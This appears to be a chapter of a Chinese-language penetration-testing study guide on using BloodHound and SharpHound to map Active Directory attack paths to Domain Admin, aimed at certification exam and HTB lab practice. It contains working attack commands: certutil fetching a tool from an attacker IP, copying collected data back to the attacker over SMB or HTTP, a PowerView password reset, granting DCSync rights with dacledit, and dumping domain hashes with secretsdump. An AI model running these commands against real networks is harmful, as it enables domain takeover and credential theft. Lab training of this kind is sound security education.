# Ch 33 — BloodHound + SharpHound：攻擊路徑視覺化

> 目標：用 SharpHound 收集 AD 資料，用 BloodHound 視覺化分析，找到從低權限帳號到 Domain Admin 的最短路徑。

## BloodHound 是什麼

BloodHound 把 AD 的關係（使用者、群組、ACL、信任關係）轉成圖形，讓你一眼看到「從 alice 到 Domain Admin 要怎麼走」。

沒有 BloodHound 就要手動分析幾千個 AD 物件之間的關係——在考試 24 小時內不現實。

## 架構

```
SharpHound（收集器）→ 在靶機或 Kali 跑，蒐集 AD 資料
           ↓（輸出 ZIP 檔）
BloodHound（視覺化）→ 在 Kali 跑，匯入 ZIP 分析
```

## 安裝 BloodHound（Kali）

```bash
# 安裝
sudo apt install bloodhound neo4j

# 啟動 Neo4j 資料庫
sudo neo4j start
# 或
sudo neo4j console

# 預設 URL：http://localhost:7474
# 預設帳密：neo4j/neo4j（第一次登入要改密碼）

# 啟動 BloodHound GUI
bloodhound &
# 登入：neo4j/你改的密碼
```

## 收集資料

### 方法一：bloodhound-python（從 Kali 遠端收集）

```bash
pip3 install bloodhound

# 有域帳號就能跑
python3 -m bloodhound -u alice -p 'Password123' -d corp.local -dc dc.corp.local -c all

# 輸出：20230101_BloodHound.zip
```

**最方便，不用在靶機上跑任何東西。**

### 方法二：SharpHound.exe（在 Windows 靶機上跑）

```cmd
# 傳 SharpHound.exe 到靶機
certutil -urlcache -f http://10.10.14.5/SharpHound.exe C:\Windows\Temp\SharpHound.exe

# 執行收集
C:\Windows\Temp\SharpHound.exe -c All

# 輸出：20230101_BloodHound.zip
# 把 zip 傳回 Kali
```

### 傳回 Kali

```bash
# 靶機用 SMB 傳（如果 Kali 開了 SMB）
impacket-smbserver share /tmp -smb2support

# 靶機：
copy C:\Windows\Temp\BloodHound.zip \\10.10.14.5\share\

# 或靶機跑 HTTP server
python3 -m http.server 8888
# Kali 下載：
wget http://10.10.10.x:8888/BloodHound.zip
```

## BloodHound 分析

### 匯入資料

```
BloodHound → Upload Data（右上角上傳圖示）
→ 選 ZIP 檔
→ 等待處理
```

### 內建查詢

左側 Analysis → Pre-Built Analytics Queries：

```
Find Shortest Paths to Domain Admins    ← 最重要
Find All Domain Admins
Find Computers Where Domain Users are Local Admin
Shortest Path to High Value Targets
Find Principals with DCSync Rights
```

### 解讀圖形

```
節點（Node）：使用者、電腦、群組
邊（Edge）：關係（AdminTo, MemberOf, HasSession, CanRCDP...）

邊的顏色和意義：
  MemberOf     → A 是 B 的成員
  AdminTo      → A 在 B 機器上是 Local Admin
  HasSession   → A 在 B 機器上有登入 session
  CanRDP       → A 可以 RDP 到 B
  GenericAll   → A 對 B 有完全控制
  WriteDACL    → A 可以修改 B 的 DACL（ACL）
  GenericWrite → A 可以寫 B 的任意屬性
```

### 找攻擊路徑的典型發現

**典型一：服務帳號有 DA 成員**

```
svc-sql → [MemberOf] → Domain Admins
```

→ Kerberoast svc-sql，破解後直接有 DA

**典型二：普通用戶 → 橫向 → 有 session 的機器 → Token 竊取 → DA**

```
alice → [AdminTo] → WORKSTATION-01 → [HasSession] → bob (Domain Admin)
```

→ 移動到 WORKSTATION-01 → 竊取 bob 的 Token / Hash → 以 bob 身份操作

**典型三：ACL 攻擊**

```
alice → [GenericAll] → svc-backup → [MemberOf] → Backup Operators
```

→ alice 可以修改 svc-backup 的屬性（如密碼）→ 取得 Backup Operators 權限

### 右鍵節點

對任何節點右鍵 → Shortest Paths to Here → 看從你當前帳號怎麼到這個節點

對邊右鍵 → Help → 說明這個關係可以怎麼利用

## BloodHound 上的 ACL 攻擊

如果 BloodHound 顯示你有 `GenericAll` 或 `WriteDACL` 對某個帳號：

```powershell
# 修改目標帳號密碼（GenericAll 或 GenericWrite）
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity svc-backup -AccountPassword (ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force) -Verbose
```

如果有 `DCSync Rights`（WriteDACL + ExtendedRight）：

```bash
# 先修改自己的 DCSync 權限
python3 dacledit.py -action 'write' -rights 'DCSync' -principal alice -target-dn 'DC=corp,DC=local' corp.local/alice:'Password123'

# 然後執行 DCSync
python3 secretsdump.py corp.local/alice:'Password123'@10.10.10.x -just-dc
```

## 本章對應靶機

| 機器 | BloodHound 分析 |
|------|---------------|
| HTB Forest | bloodhound-python 收集，WriteDACL 攻擊路徑 |
| HTB Active | 直接 Kerberoasting 就夠，BloodHound 輔助確認 |
| HTB Cascade | LDAP 枚舉 + BloodHound |

## 自我檢核

- [ ] 能安裝並啟動 BloodHound（Neo4j + BloodHound GUI）
- [ ] 能用 bloodhound-python 收集資料
- [ ] 知道「Find Shortest Paths to Domain Admins」這個查詢
- [ ] 能解讀 GenericAll / WriteDACL 這類邊代表什麼

→ [Ch 34 Pass-the-Hash / Pass-the-Ticket](./34-lateral-movement.md)
